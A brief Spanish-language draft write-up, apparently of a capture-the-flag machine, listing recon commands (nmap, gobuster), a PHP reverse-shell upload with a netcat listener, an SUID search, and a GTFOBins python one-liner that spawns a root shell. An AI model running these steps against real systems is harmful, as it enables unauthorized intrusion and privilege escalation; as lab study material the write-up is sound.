---
draft: "true"
---

# Reconocimiento
Nmap 
`nmap -sV $IP`
`gobuster dir -u $IP -w /usr/share/wordlist/dirb/small.txt`
# Explotación

He subido una reverse shell de PHP de pentest monkey.
[[php-reverse-shell.php]]
`nc -lvp 2222`
`find / -type f -name user.txt`

# Escalada de privilegios

He buscado por SUID activado.
`find / -user root -perm /4000 2>/dev/null`

He encontrado python
Me he metido en gtfbins y lo busque.
https://gtfobins.github.io/gtfobins/python/#suid
`./python -c 'import os; os.execl("/bin/sh", "sh", "-p")

`find / -type f -name root.txt`